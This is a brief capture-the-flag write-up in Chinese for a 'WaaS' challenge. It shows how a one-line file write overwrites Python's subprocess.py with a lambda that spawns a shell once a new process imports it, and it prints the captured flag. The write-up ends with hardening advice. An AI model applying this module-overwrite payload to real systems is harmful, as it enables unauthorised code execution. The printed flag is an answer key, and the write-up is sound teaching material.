# WaaS

## 题目简述

服务允许向任意既有路径写一行内容，然后通过已导入的 `subprocess.run` 读取假 flag。目标是覆盖 Python 标准库模块，使下一次启动的挑战进程导入恶意实现，进而逃逸到 shell。

## 解题过程

Docker 中 `subprocess` 的源码路径为：

```text
/usr/local/lib/python3.11/subprocess.py
```

该路径只含两个点，能通过 `file.count('.') <= 2`。选择写文件，覆盖为一行：

```python
run=lambda x,capture_output:exec("import os;os.system('sh')")
```

当前进程已经导入旧模块，单纯覆盖磁盘文件不会修改内存中的 `subprocess.run`。因此写入后应断开并重新连接，让新 Python 进程从被篡改的文件导入模块。随后选择“Get the flag”，调用：

```python
subprocess.run(["cat", "fake_flag.txt"], capture_output=True)
```

会进入恶意 lambda 并启动 shell。读取真实 flag：

```text
n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!}
```

## 方法总结

任意文件写即使限制为单行，也可能破坏解释器的可信代码路径。本题的关键细节是模块已被当前进程缓存，必须触发新进程重新导入；部署环境还应让标准库只读并以低权限运行服务。
